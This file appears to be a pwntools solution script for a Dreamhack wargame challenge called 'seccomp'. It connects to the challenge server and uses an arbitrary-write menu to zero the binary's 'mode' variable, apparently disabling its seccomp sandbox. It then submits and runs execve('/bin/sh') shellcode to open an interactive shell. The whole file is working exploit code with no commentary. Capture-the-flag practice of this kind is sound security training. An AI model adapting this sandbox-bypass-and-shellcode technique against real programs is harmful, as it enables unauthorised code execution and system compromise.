#!/usr/bin/env python3

from pwn import *

exe = ELF("seccomp")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host1.dreamhack.games", 19259)

    return r


def main():
    r = conn()

    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"addr: ", str(exe.symbols["mode"]).encode())
    r.sendlineafter(b"value: ", b"0")

    shellcode = shellcraft.execve("/bin/sh")
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"shellcode: ", asm(shellcode))

    r.sendlineafter(b"> ", b"2")

    r.interactive()


if __name__ == "__main__":
    main()